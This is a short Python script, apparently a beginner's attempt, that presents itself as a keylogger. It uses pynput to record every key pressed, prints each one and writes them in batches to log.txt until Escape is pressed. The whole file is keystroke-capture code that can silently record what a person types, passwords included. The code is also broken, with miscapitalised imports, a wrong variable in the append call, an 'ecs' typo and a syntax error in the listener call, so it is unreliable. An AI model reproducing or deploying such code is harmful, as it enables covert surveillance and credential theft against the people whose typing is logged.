#key logger application

#modules to use for this application
import pynput

from pynput.keyboard import key, listener

count = 0
keys= []

def write_file(key):
    #create the file ine and convert key to str to be in txt file
    with open("log.txt", 'a') as f:
        for key in keys:
            f.write(str(key))


def on_press(key):
    #function to keep track of key pressed
    global keys, count
    key.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    #function to know when key has been released
    if key == key.ecs:
        return False
    
    
with listener(on_press = on_press, on_release) as listener:
    listener.join()
